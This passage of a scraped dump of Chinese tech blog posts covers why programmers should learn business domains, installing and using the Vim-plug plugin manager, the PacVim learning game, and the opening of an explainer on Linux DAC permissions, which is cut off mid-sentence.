等，也还有一大堆东西等着你去学习。这些书不仅仅更新你的知识，还能让你对一些技术的理解更加深刻。,\n,多谢阅读。如果你喜欢这些书，就把它们分享给你的朋友和同学吧。如果有任何建议，或有书籍想在2018年分享给大家，欢迎留言。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        , 7 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,yizhe,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            JAVA软件工程师        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 11,        ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113955/", "url_object_id": "0645d6761f7b849238e3183e177cfb24", "front_image_path": "full/b09da3ea14a596f136aeea129afb4a2ac85bce08.jpg"},{"front_image_url": ["http://ww3.sinaimg.cn/mw690/7cc829d3gw1eizj4iuehrj20eq0b2gn2.jpg"], "title": "为什么码农要了解业务？", "create_time": "2018/06/12", "vote": "1", "bookmark": "4", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,来自 jerryhuang650 推荐\r\n,   ,\n, 最近一位分析界的老前辈对我很无奈地摇摇头，“这帮程序员，不食人间烟火哪！”我也深有感触，全世界的码农都一个样。,\n,这让我想起了，同样也是他，在多年之前，对我提了警醒——要重视业务。从那之后，我一直狂奔在技术+业务的双修道路上。,\n,放在以前，码农这个族群一定是稀罕动物。但在今天，这个世界最不缺的应该就是码农了，未来最廉价的也将是码农。仅有泛泛一技，在未来并不吃香，因为那是要被机器人所取代的。,\n,这个世界，缺的是技术过硬又精通业务的工程师，缺的是真正能解决实际业务问题的人，缺的是复合型的人才。,\n,码农不是工程师，码农只是会写代码，只会明确需求和逻辑的情况下写代码。工程师则不一样，懂得用技术怎么解决实际业务问题，用技术驱动业务的发展。,\n,\n,什么叫业务？,\n,先来明确这个问题。,\n,业务是一个很实在的东西，看得见感受得到，接地气儿。,\n,业务就是我们所能理解和感受的世界，就是这个世界或者某个行业的运转逻辑、流程与现状，是结果表象，是能够被看见和感受的，也是内在本质，是能够被洞察和感知的。,\n,业务就是这个世界发生了什么，什么时候，谁参与，怎么发生，结果如何。,\n,业务就是什么时候，谁在哪里，买了什么东西，花了多少钱，用什么支付。,\n,业务就是这个行业怎么发展起来的，现状如何，未来趋势如何，用了什么技术，有什么企业，商业模式如何，盈利能力如何，目前主要面临什么问题，消费者有什么特点，等等。,\n,世界很复杂，单个细分行业的业务也很复杂。,\n,为什么要了解业务？,\n,谈到这个，码农们一定有所不悦，“熟悉业务是需求分析师做的事，跟我们没有关系。”,\n,打个不恰当的比喻。有10个人经过一栋写字楼，突然从楼上掉下来几块砖头，砸中了9个人，其中就有7个码农，3个硕士，1个博士（原谅我又犯职业病，拿数据说话了）。而没被砸到的那个人，恰好因为了解到之前经常发生这样的事而绕道行走。,\n,如果你只会写代码，你不是不可替代的，而是可有可无的。因为这年头，会JAVA、C、Python的程序员，在大街上一抓一大把。现在已经开始提倡，编程从娃娃抓起了。10后都开始跟你抢饭碗了，你怕不怕？,\n,但话也不是那么极端，除非你的技术很牛逼，在国内或者某个行业内能够排上号的。但技术牛逼的人，也不是只是技术超群，还常常因为能够利用手中的技术解决某方面的业务问题，做了哪些突出的贡献。我们出来混，也是要拿成果说话的，做过什么项目，有什么价值。这种价值往往就是针对业务而说的。,\n,IT研发与业务需求方常常是一对冤家，常常因为一个业务功能实现争辩得耳红面赤。研发觉得这个功能很low，没什么技术含量，业务方却认为这个功能却很有用，需要花功夫做细做深做好。现实情况是，功能做出来了，却很难用，或者经常用不了，或者数据不对。研发想做点高大上的功能，业务方却认为太虚了，没什么用。（IT与业务方那点事就不多说了，大家都心知肚明~~）,\n,多年经验反复告诫我，鉴定一个功能是不是好功能，唯一的标准是看它能否支撑业务、改善业务、推动业务，也即应用效果。一个产品，只要有30%的功能，让业务用户用起来很爽，感觉帮助很大，就已经是一个不错的产品了。,\n,我们都认同，技术驱动业务。但我们不一定明白，正是由于业务的某些强烈需求，才推动技术的发展与落地。,\n,说这些，我是想说，作为技术人员，我们既要仰望星空，也要脚踏实地，既要追逐腾飞的技术，也要重视落地的业务。,\n,如果一个业务人员很懂技术，那将很可能是技术人员的灾难。因为那样的话，业务人员会很强势，又或者那样就没有技术人员什么事了。,\n,当然，也不难想象，一个真正懂看数据的测试人员，就好比一个真正懂用算法的业务人员一样难得。,\n,业务与数据的关系,\n,真实（而不是杜撰、模拟、伪造）、可量化、可被记录的数据一定会反映真实世界某方面的业务情形。而现实当中很多业务场景都可由数据体现出来。,\n,零售是业务场景最繁多且最贴近我们生活的行业，可以从中找到很多方便理解的例子。,\n,当你在一个酷热难耐的夏天上午10点，走进位于公司附近的全家便利店，使用微信支付，花了3.5元，买了一瓶无糖330ml摩登罐的可乐，而且刷会员卡攒了100积分，而收银员MM返回给了你一张POS单据，这时你所发生的这一切都已经通过收银记录在了全家的数据库里。更糟糕的是，店里的摄像头也已经把你在店里的一举一动录了下来了，转化成为一帧帧图像数据。,\n,这就是，业务数据化。,\n,店长通过数据分析发现，最近3.5元330ml摩登罐可乐的销量比上月增长了20%，而消费者中75%是20-35岁的男性，相比之下，300ml塑料瓶装的可乐销量却下滑40%。店长权衡比较了一下，300ml塑料瓶装可乐利润低，330ml摩登罐可乐目前更受年轻人欢迎，考虑到日渐增长的租金压力，做了一个大胆的决定——下架300ml塑料瓶装可乐，增加330ml摩登罐可乐的商品。（又拿数据说话了。）,\n,这就是，数据业务化。,\n,或者，数据驱动业务。,\n,当我开始接触一个行业时，我通常会花2-3周的时间去了解这个行业的业务，然后就大致清楚这个行业有什么样的数据，可以做哪方面的分析，解决什么问题。,\n,当遇到不好理解的分析结果时，我经常使用业务联想法，设身处地去体会结果所反映的业务场景是什么样的。,\n,如何了解业务？,\n,这个说大了，就是如何看这个世界。每个人有每个人的方法论，每个人有每个人的世界观，每个人有每个人的逻辑思维。,\n,我们都知道，观念的转变是最难的，也有很多不确定性。有些人可能因为自己的切身体会一天就改变了之前几十年根深蒂固的看法，有些人任由三姑六婆苦口婆心地劝说就是不肯改变自己的择偶观，却有可能因为自己年岁渐大不断降低自己的标准。,\n,但最好也及早要形成科学的思考方法，帮助正确地理解这个世界。,\n,以“面-线-点”的方式可以较为全面、系统、深入地了解一个行业，然后是某个垂直领域，最后再到具体业务场景。,\n,佛系文化的流行，使得年轻一代降低对这个世界的关注度，一切都无所谓，一切都漠不关心。,\n,这个世界从来没有变好过，但我们每个人都是这个世界的匆匆过客，都是行走在自己的人生路上不断领略这个世界的美与丑。这世间的风景，这世间的悲欢离合，如果我们积极地探索与领悟，也不枉来这世间走一遭。,\n,保持好奇心，可以驱动我们的思考，强化我们的认知，丰富我们的内在。,\n,这是我想说的第二个方面。,\n,怀有好奇心，就会渐渐地敏锐观察这个世界，多问自己一些为什么。,\n,我家附近原来有个沃尔玛超市，现在地产商将它装修一番，引入了不少餐厅，刚开张不久，我就去那里吃饭，吃的是烤鸭，一个多两个月后，再去那里吃饭，发现有一半的餐厅已经关门了。,\n,在去地铁站的那条路上，每天人流如梭，一点点，即使到了深夜，依然有很多人在门口排队买奶茶。然而，仅仅隔了一个店铺的喜茶，做不下去，关门了。两三个月前又换成粉店，路转粉。每天下班路过时，发现店里顾客不到10个，门可罗雀。,\n,为什么每家一点点奶茶店门口，不管是什么时候都是很多人，他们是托儿还是真的顾客？,\n,因为喜欢新鲜，不喜欢在冰箱里存太多菜，且附近没有菜市场，所以常去买菜的还是附近的钱大妈。但我却没怎么去更近的一家生活超市，店面比较大，除果肉蔬菜外，也卖油盐酱醋，还有生活用品，但奇怪的是顾客却不到钱大妈的1/10。,\n,为什么几乎所有潮州牛肉店都很多人，有很多甚至在门口排了很长的队？,\n,观察到这些，常常会陷入思考，为什么会发生这些，新零售到底改变了什么？,\n,再举个例子。,\n,去年拿保温杯泡着枸杞的中年男火了。,\n,关于这个，我又问了自己几个问题：拿着保温杯泡着枸杞的是不是都是中年男？如果是，这个特征能否被数据量化？可否考虑加入到算法模型当中，加以应用起来？,\n,虽然很多问题，我没有找到答案，但多问自己问题，会引发自己不断深入思考，不断激发自己好奇心，不断去研究。,\n,很多业务知识都是零散的，不可能在短时间内完全了解，可以在日常不断积累。,\n,关于日常积累业务知识，可以经常询问懂业务的人。这是我想说的第三个方面。,\n,刚进公司的时候，我以为业务很简单。很快，我就发现里面的坑不少。加上所在团队的成员也是刚入职不久的，问问题没处可问。过了一个月之后，我发现隔壁团队有两个十年左右的老员工，业务很熟，而且人特好。于是，我几乎一遇到业务问题，就跑过去“骚扰”他们，他们也很乐意解答，如果他们不清楚，他们也会告诉我应该去找谁了解。大约半年之后，我基本摸透了顺丰的数据和业务情况。我也和那两位老员工建立了不错的友谊，即使后来换了部门，我也经常过去找他们。,\n,跟懂业务的人搞好关系，遇到业务问题，多咨询他们，这是最有效最接地气的办法。,\n,多看书，这是我想说的第四个方面。,\n,比如说，从事新零售领域方面的工作，总得先了解新零售是怎么回事。你可以去听专家们忽悠，但这样的机会很少，而且时间也有限，说不定成本还很高。,\n,读书则不一样。读书，意味着主动了解，主动去构建自己的知识体系。,\n,读书的重要性，这里不多言了。,\n,如果您读这篇文章的时候，您恰好也是一位数据人。我还想告诫一句：我们不能脱离业务去看数据，而是要时刻从业务角度去理解数据。,\n,我们不敢期望可以完全理解这个世界，但也憧憬着我们不单可以在代码的世界里畅快驰骋，论剑江湖，也可以放下身段洞察芸芸众生之百态，领悟人间世俗之真情。,\n,如果真的可以的话，就没有需求分析师什么事了。,\n,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 4 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/107275/", "url_object_id": "c8e1a285b335f2a803ddd35756a4148a", "front_image_path": "full/3c9d695ba504fed7faa5375f3c80ff7f2ff90de4.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/e10fe1fd7da125e34ea34b9f5dad9c30.png"], "title": "Vim-plug：极简 Vim 插件管理器", "create_time": "2018/06/17", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Sk,   译文出处：,Linux中国/geekpi,   ,\n,当没有插件管理器时，Vim 用户必须手动下载 tarball 包形式的插件，并将它们解压到 ,~/.vim, 目录中。在少量插件的时候可以。但当他们安装更多的插件时，就会变得一团糟。所有插件文件分散在单个目录中，用户无法找到哪个文件属于哪个插件。此外，他们无法找到他们应该删除哪个文件来卸载插件。这时 Vim 插件管理器就可以派上用场。插件管理器将安装插件的文件保存在单独的目录中，因此管理所有插件变得非常容易。我们几个月前已经写了关于 ,Vundle, 的文章。今天，我们将看到又一个名为 “Vim-plug” 的 Vim 插件管理器。,\n,Vim-plug 是一个自由、开源、速度非常快的、极简的 vim 插件管理器。它可以并行地安装或更新插件。你还可以回滚更新。它创建浅层克隆shallow clone最小化磁盘空间使用和下载时间。它支持按需加载插件以加快启动时间。其他值得注意的特性是支持分支/标签/提交、post-update 钩子、支持外部管理的插件等。,\n,安装,\n,安装和使用起来非常容易。你只需打开终端并运行以下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ curl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,curl, ,-,fLo, ,~,/,.,vim,/,autoload,/,plug,.,vim, ,--,create,-,dirs ,https,:,//raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,Neovim 用户可以使用以下命令安装 Vim-plug：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ curl -fLo ~/.config/nvim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,curl, ,-,fLo, ,~,/,.,config,/,nvim,/,autoload,/,plug,.,vim, ,--,create,-,dirs ,https,:,//raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,用法,\n,安装插件,\n,要安装插件，你必须如下所示首先在 Vim 配置文件中声明它们。一般 Vim 的配置文件是 ,~/.vimrc,，Neovim 的配置文件是 ,~/.config/nvim/init.vim,。请记住，当你在配置文件中声明插件时，列表应该以 ,call plug#begin(PLUGIN_DIRECTORY), 开始，并以 ,plug#end(), 结束。,\n,例如，我们安装 “lightline.vim” 插件。为此，请在 ,~/.vimrc, 的顶部添加以下行。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ncall plug#begin('~/.vim/plugged')\r\nPlug 'itchyny/lightline.vim'\r\ncall plug#end()\r\n\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,call ,plug,#begin('~/.vim/plugged'),Plug, ,'itchyny/lightline.vim',call ,plug,#end(), , ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在 vim 配置文件中添加上面的行后，通过输入以下命令重新加载：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n:source ~/.vimrc\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,:,source, ,~,/,.,vimrc, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,或者，只需重新加载 Vim 编辑器。,\n,现在，打开 vim 编辑器：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ vim\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,vim, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用以下命令检查状态：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n:PlugStatus\r\n\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,:,PlugStatus, , ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,然后输入下面的命令，然后按回车键安装之前在配置文件中声明的插件。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n:PlugInstall\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,:,PlugInstall, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,更新插件,\n,要更新插件，请运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n:PlugUpdate\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,:,PlugUpdate, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,更新插件后，按下 ,d, 查看更改。或者，你可以之后输入 ,:PlugDiff,。,\n,审查插件,\n,有时，更新的插件可能有新的 bug 或无法正常工作。要解决这个问题，你可以简单地回滚有问题的插件。输入 ,:PlugDiff, 命令，然后按回车键查看上次 ,:PlugUpdate,的更改，并在每个段落上按 ,X, 将每个插件回滚到更新前的前一个状态。,\n,删除插件,\n,删除一个插件删除或注释掉你以前在你的 vim 配置文件中添加的 ,plug, 命令。然后，运行 ,:source ~/.vimrc, 或重启 Vim 编辑器。最后，运行以下命令卸载插件：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n:PlugClean\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,:,PlugClean, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,该命令将删除 vim 配置文件中所有未声明的插件。,\n,升级 Vim-plug,\n,要升级vim-plug本身，请输入：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n:PlugUpgrade\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,:,PlugUpgrade, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如你所见，使用 Vim-plug 管理插件并不难。它简化了插件管理。现在去找出你最喜欢的插件并使用 Vim-plug 来安装它们。,\n,就是这些了。我将很快在这里发布另一个有趣的话题。在此之前，请继续关注我们。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114132/", "url_object_id": "a00b9ec8e1a1878cf2a49e643d90596d", "front_image_path": "full/a1813a88fb7af8cb32f88586ab2caa5f85752176.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/57beea594a88813722998ea81bc96125.png"], "title": "PacVim：一个学习 vim 命令的命令行游戏", "create_time": "2018/06/19", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Sk,   译文出处：,Linux中国/geekpi,   ,\n,你好，Vim用户！今天，我偶然发现了一个很酷的程序来提高 Vim 的使用技巧。Vim 是编写和编辑代码的绝佳编辑器。然而，你们中的一些人（包括我）仍在陡峭的学习曲线中挣扎。再也不用了！来看看 ,PacVim,，一款可帮助你学习 Vim 命令的命令行游戏。PacVim 的灵感来源于经典游戏 ,PacMan,，它以一种好玩有趣的方式为你提供了大量的 Vim 命令练习。简而言之，PacVim 是一种深入了解 vim 命令的有趣而自由的方式。请不要将 PacMan 与 ,pacman, （arch Linux 包管理器）混淆。 PacMan 是 20 世纪 80 年代发布的经典流行街机游戏。,\n,在本简要指南中，我们将看到如何在 Linux 中安装和使用 PacVim。,\n,安装 PacVim,\n,首先按如下链接安装 ,Ncurses, 库和,开发工具,。,\n,\n,如何在 Linux 中安装 Ncurses 库,\n,如何在 Linux 中安装开发工具,\n,\n,请注意，如果没有 gcc 4.8.X 或更高版本，这款游戏可能无法正确编译和安装。我在 Ubuntu 18.04 LTS 上测试了 PacVim，并且完美运行。,\n,安装 Ncurses 和 gcc 后，运行以下命令来安装 PacVim。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ git clone https://github.com/jmoon018/PacVim.git\r\n$ cd PacVim\r\n$ sudo make install\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,git ,clone, ,https,:,//github.com/jmoon018/PacVim.git,$, ,cd ,PacVim,$, ,sudo ,make ,install, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,使用 PacVim 学习 Vim 命令,\n,启动 PacVim 游戏,\n,要玩这个游戏，只需运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pacvim [LEVEL_NUMER] [MODE]\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pacvim, ,[,LEVEL_NUMER,], ,[,MODE,], ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,例如，以下命令以普通模式启动游戏第 5 关。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pacvim 5 n\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pacvim, ,5, ,n, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这里，,5, 表示等级，,n,表示模式。有两种模式：,\n,\n,n, – 普通模式。,\n,h, – 困难模式。,\n,\n,默认模式是 ,h,，这很难：,\n,要从头开始（,0, 级），请运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pacvim\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pacvim, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,以下是我 Ubuntu 18.04 LTS 的示例输出。,\n,\n,要开始游戏，只需按下回车。,\n,\n,现在开始游戏。阅读下一节了解如何玩。,\n,要退出，请按下 ,ESC, 或 ,q,。,\n,以下命令以困难模式启动游戏第 ,5, 关。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pacvim 5 h\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pacvim, ,5, ,h, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,或者，,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pacvim 5\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pacvim, ,5, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,如何玩 PacVim？,\n,PacVim 的使用与 PacMan 非常相似。,\n,你必须跑过屏幕上所有的字符，同时避免鬼魂（红色字符）。,\n,PacVim有两个特殊的障碍：,\n,\n,你不能移动到墙壁中（黄色）。你必须使用 vim 动作来跳过它们。,\n,如果你踩到波浪字符（青色的 ,~,），你就输了！,\n,\n,你有三条生命。每次打赢 0、3、6、9 关时你都会获得新生命。总共有 10 关，从 0 到 9，打赢第 9 关后，游戏重置为第 0 关，但是鬼魂速度变快。,\n,获胜条件,\n,使用 vim 命令将光标移动到字母上并高亮显示它们。所有字母都高亮显示后，你就会获胜并进入下一关。,\n,失败条件,\n,如果你碰到鬼魂（用,红色 G, 表示）或者,波浪字符,，你就会失去一条命。如果命小于 0 条，你将会输掉整个游戏。,\n,这是实现的命令列表：,\n,\n,\n,\n,键,\n,作用,\n,\n,\n,\n,\n,q,\n,退出游戏,\n,\n,\n,h,\n,向左移动,\n,\n,\n,j,\n,向下移动,\n,\n,\n,k,\n,向上移动,\n,\n,\n,l,\n,向右移动,\n,\n,\n,w,\n,向前移动到下一个 word 开始,\n,\n,\n,W,\n,向前移动到下一个 WORD 开始,\n,\n,\n,e,\n,向前移动到下一个 word 结束,\n,\n,\n,E,\n,向前移动到下一个 WORD 结束,\n,\n,\n,b,\n,向后移动到下一个 word 开始,\n,\n,\n,B,\n,向后移动到下一个 WORD 开始,\n,\n,\n,$,\n,移动到行的末尾,\n,\n,\n,0,\n,移动到行的开始,\n,\n,\n,gg/1G,\n,移动到第一行的开始,\n,\n,\n,数字加 G,\n,移动到由数字给出的行的开始,\n,\n,\n,G,\n,移到最后一行的开头,\n,\n,\n,^,\n,移到当前行的第一个 word,\n,\n,\n,＆,\n,1337 cheatz（打赢当前关）,\n,\n,\n,\n,玩过几关之后，你可能会注意到 vim 的使用有改善。一段时间后继续玩这个游戏，直到你掌握 Vim 的使用。,\n,建议阅读：,\n,今天就是这些。希望这篇文章有用。PacVim 好玩又有趣并且让你有事做。同时，你应该能够彻底学习足够的 Vim 命令。试试看，你不会感到失望。,\n,还有更多的好东西。敬请关注！,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114134/", "url_object_id": "f852671c846c5a0304c03ce2522024c6", "front_image_path": "full/bdfaedb6c82e2ca844b66f19b78be2b5b4ef49f1.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "Linux 权限控制的基本原理", "create_time": "2018/06/13", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,本文来自作者（吕凯）的推荐,   ,这里，我们主要介绍 ,Linux, 系统中，权限控制的基本原理。,\n,安全模型,\n,在 ,Linux, 系统中，我们所有的操作实质都是在进行进程访问文件的操作。我们访问文件需要先取得相应的访问权限，而访问权限是通过 ,Linux, 系统中的安全模型获得的。,\n,对于 ,Linux, 系统中的安全模型，我们需要知道下面两点,\n,\n,Linux, 系统上最初的安全模型叫 ,DAC,, 全称是 ,Discretionary Access Control, ，翻译为自主访问控制。,\n,后来又增加设计了一个新的安全模型叫 ,MAC,, 全称是 ,Mandatory Access Control,, 翻译为强制访问控制。,\n,\n,注意, ,MAC, 和 ,DAC, 不是互斥的， ,DAC, 是最基本的安全模型，也是通常我们最常用到的访问控制机制是 ,Linux, 必须具有的功能， 而 ,MAC, 是构建在 ,DAC, 之上的加强安全机制，属于可选模块。访问前， Linux系统通常都是先做 ,DAC, 检查， 如果没有通过则操作直接失败; 如果通过 ,DAC, 检查并且系统支持 ,MAC, 模块，再做 ,MAC, 权限检查。,\n,为区分两者，我们将支持 ,MAC, 的 ,Linux, 系统称作 ,SELinux,, 表示它是针对 ,Linux, 的安全加强系统。,\n,这里，我们将讲述 ,Linux, 系统中的 ,DAC, 安全模型。,\n,DAC, 安全模型,\n,DAC, 的核心内容是：在 ,Linux, 中，进程理论上所拥有的权限与执行它的用户的权限相同。其中涉及的一切内容，都是围绕这个核心进行的。,\n,用户和组ID信息控制,\n,用户、组、口令信息,\n,通过 ,/etc/passwd, 和 ,/etc/group, 保存用户和组信息，通过 ,/etc/shadow, 保存密码口令及其变动信息， 每行一条记录。,\n,用户和组分别用 ,UID, 和 ,GID, 表示，一个用户可以同时属于多个组，默认每个用户必属于一个与之 ,UID, 同值同名的 ,GID, 。,\n,对于 ,/etc/passwd, , 每条记录字段分别为 ,用户名:口令（在 /etc/shadow 加密保存）：UID:GID（默认UID）:描述注释:主目录:登录shell(第一个运行的程序),\n,对于 ,/etc/group, ， 